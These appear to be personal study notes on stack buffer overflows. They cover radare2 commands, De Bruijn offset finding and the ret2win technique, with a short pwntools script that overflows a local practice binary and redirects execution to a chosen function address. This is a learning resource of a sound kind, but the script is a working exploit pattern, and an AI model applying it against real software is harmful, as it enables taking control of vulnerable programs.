===Stack==
- Region of memory storing temporary variables created by functions in code.
- Function called -> Memory address pushed into stack. 

Radare2 (Binary reverse-engineering and analysis tool)
s main; pdf | [s] Seek main, [pdf] Print Disassembly Function
pxw @ esp | Stack view
dr <register> | Show register
EIP (Extended Instruction Pointer) | Points to next instruction

ret2win
1) Identify minimum Offset/padding 
Padding | Offset/padding to cause segmentation fault
2) Target function/memory address
afl (Command) | Analyse Functions List (List functions of binary). 
      - Identify target function to execute and its memory address.
3) Prepare (Overwrite saved return pointer/address that will popped into EIP) 
Overflow and give EIP target memory address.

from pwn import *            # pwntools Import

p = process('./vuln')        # Start process

payload = b'A' * 52          # String to bytes because of next line
payload += p32(0x080491c3)   # Target memory address (p32 function returns bytes) - Endianness

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output target string.

De Bruijn Sequences (Offset Calculations)
"ragg2 -P 100 -r" generates pattern of length 100 in ascii bytes.
Sequence added when prompted for input and receive address program crashes at.
wopO <Memory Address> | Provides offset.

Shellcode
- Running own instructions
Von Neumann architecture | No differentiation between data and instructions
px @ ebp-0x134 | Inspect local variable.
